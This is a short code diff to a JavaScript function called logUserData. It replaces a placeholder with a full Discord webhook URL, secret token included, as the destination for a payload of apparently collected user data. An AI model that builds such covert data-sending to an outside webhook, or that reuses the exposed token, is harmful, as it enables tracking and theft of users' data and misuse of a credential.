@@ -9,7 +9,7 @@ function logUserData() {
     };
 
     // Discord Webhook URL (replace with your actual webhook URL)
-    const discordWebhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
+    const discordWebhookURL = 'https://discord.com/api/webhooks/1301223126037827666/rw81EBn4zuN2Y-8zmRwUidiYdXnv7HmJtVutM0KUWOmTnj2-t5RpJwFfqQtcXUW61XG8';
 
     // Prepare the payload for Discord
     const discordPayload = {
